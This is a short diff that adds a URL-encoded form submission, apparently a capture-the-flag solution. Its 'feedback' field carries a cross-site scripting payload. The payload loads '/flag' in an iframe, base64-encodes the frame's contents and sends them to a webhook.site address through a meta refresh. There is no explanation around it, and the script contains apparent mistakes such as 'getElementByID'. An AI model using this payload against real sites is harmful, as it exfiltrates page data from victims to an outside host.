@@ -1,0 +1,4 @@
+feedback=<script>
+    let s = "<html xmlns=\"http://www.w3.org/1999/xhtml\"><head><meta http-equiv='Content-Security-Policy' content=\"default-src 'self'; frame-src 'self'\"></head><body><iframe id='i' src='/flag'></iframe><script>document.write(''.concat('<meta http-equiv=refresh content=\"2; url=https://webhook.site/a5e749c7-16bd-488e-b2fb-fa6af92f6be1?ex=',window.btoa(document.getElementByID('i').contentWindow.body.innerHTML),'\">'));</script></body>";
+    document.write(s);
+</script>&submit=Submit+Query
